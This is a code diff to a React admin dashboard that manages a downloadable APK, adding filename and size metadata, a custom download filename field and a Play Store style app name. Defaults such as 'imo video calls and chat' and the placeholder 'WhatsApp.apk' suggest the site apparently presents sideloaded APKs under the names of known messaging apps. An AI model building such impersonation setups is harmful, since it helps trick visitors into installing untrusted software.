@@ -373,7 +373,11 @@ export default function AdminDashboard({ initialConfig = {}, isQueryAuth = false
         return;
       }
 
-      const saveRes = await saveApkUrlAction(uploadData.apkUrl);
+      const saveRes = await saveApkUrlAction(uploadData.apkUrl, {
+        fileName: uploadData.fileName,
+        originalName: uploadData.originalName,
+        fileSize: uploadData.fileSize,
+      });
       if (saveRes.success) {
         setConfig((prev) => ({
           ...prev,
@@ -381,9 +385,18 @@ export default function AdminDashboard({ initialConfig = {}, isQueryAuth = false
           apk: {
             ...(prev.apk || {}),
             apkUrl: uploadData.apkUrl,
+            fileName: uploadData.fileName,
+            originalName: uploadData.originalName,
+            fileSize: uploadData.fileSize,
+          },
+          playStore: {
+            ...(prev.playStore || {}),
+            appName: (prev.playStore?.appName === 'imo video calls and chat' || !prev.playStore?.appName)
+              ? (uploadData.appName || prev.site?.name || prev.playStore?.appName)
+              : prev.playStore?.appName,
           },
         }));
-        setStatus({ type: 'success', msg: `✅ APK uploaded & saved! Active URL: ${uploadData.apkUrl}` });
+        setStatus({ type: 'success', msg: `✅ APK uploaded & saved! File: ${uploadData.fileName} (${uploadData.fileSize})` });
       }
     } catch (err) {
       setStatus({ type: 'error', msg: `❌ Upload error: ${err.message}` });
@@ -427,12 +440,25 @@ export default function AdminDashboard({ initialConfig = {}, isQueryAuth = false
       alert('No APK URL configured yet.');
       return;
     }
+    const downloadName = config.apk?.fileName || config.apk?.originalName || (config.site?.name ? `${config.site.name.replace(/[^a-zA-Z0-9._\-]/g, '_')}.apk` : 'app.apk');
+    const finalFilename = downloadName.endsWith('.apk') ? downloadName : `${downloadName}.apk`;
+
+    const targetUrl = url.startsWith('http://') || url.startsWith('https://')
+      ? url
+      : `${window.location.origin}${url.startsWith('/') ? '' : '/'}${url}`;
+
     const link = document.createElement('a');
-    link.href = url;
-    link.download = 'imo.apk';
+    link.href = targetUrl;
+    link.download = finalFilename;
+    link.target = '_blank';
+    link.rel = 'noopener noreferrer';
     document.body.appendChild(link);
     link.click();
-    document.body.removeChild(link);
+    setTimeout(() => {
+      if (document.body.contains(link)) {
+        document.body.removeChild(link);
+      }
+    }, 300);
   }
 
   async function handleChangePassword(e) {
@@ -1498,18 +1524,58 @@ export default function AdminDashboard({ initialConfig = {}, isQueryAuth = false
 
               <div className={styles.currentUrlBox}>
                 {currentApkUrl ? (
-                  <div className={styles.urlDisplayRow}>
-                    <div className={styles.urlChip}>
-                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-                      <span className={styles.urlText}>{currentApkUrl}</span>
+                  <div>
+                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '12px', flexWrap: 'wrap', gap: '8px' }}>
+                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                        <span style={{ fontSize: '22px' }}>📦</span>
+                        <div>
+                          <strong style={{ fontSize: '15px', color: '#ffffff' }}>
+                            {config.apk?.fileName || config.apk?.originalName || (currentApkUrl ? currentApkUrl.split('/').pop() : 'app.apk')}
+                          </strong>
+                          {config.apk?.fileSize && (
+                            <span style={{ marginLeft: '10px', fontSize: '12px', background: 'rgba(255,255,255,0.15)', padding: '2px 8px', borderRadius: '4px', color: '#e0e0e0' }}>
+                              {config.apk.fileSize}
+                            </span>
+                          )}
+                        </div>
+                      </div>
                     </div>
-                    <div className={styles.quickActions}>
-                      <button className={styles.btnSmall} onClick={handleCopyUrl} title="Copy URL">
-                        {copied ? '✓ Copied' : 'Copy'}
-                      </button>
-                      <button className={styles.btnSmallPrimary} onClick={handleTestDownload} title="Test Download">
-                        Test Download
-                      </button>
+
+                    <div className={styles.urlDisplayRow}>
+                      <div className={styles.urlChip}>
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                        <span className={styles.urlText}>{currentApkUrl}</span>
+                      </div>
+                      <div className={styles.quickActions}>
+                        <button className={styles.btnSmall} onClick={handleCopyUrl} title="Copy URL">
+                          {copied ? '✓ Copied' : 'Copy'}
+                        </button>
+                        <button className={styles.btnSmallPrimary} onClick={handleTestDownload} title="Test Download">
+                          Test Download
+                        </button>
+                      </div>
+                    </div>
+
+                    <div style={{ marginTop: '16px', paddingTop: '14px', borderTop: '1px solid rgba(255,255,255,0.1)' }}>
+                      <label className={styles.formLabel}>Custom Download Filename (displayed to visitors when downloading)</label>
+                      <div style={{ display: 'flex', gap: '10px', marginTop: '6px' }}>
+                        <input
+                          type="text"
+                          className={styles.input}
+                          placeholder="e.g. WhatsApp.apk"
+                          value={config.apk?.fileName || ''}
+                          onChange={(e) => updateField('apk', 'fileName', e.target.value)}
+                        />
+                        <button
+                          type="button"
+                          className={styles.btnPrimary}
+                          disabled={saving}
+                          onClick={handleSaveConfig}
+                          style={{ whiteSpace: 'nowrap' }}
+                        >
+                          Save Name
+                        </button>
+                      </div>
                     </div>
                   </div>
                 ) : (
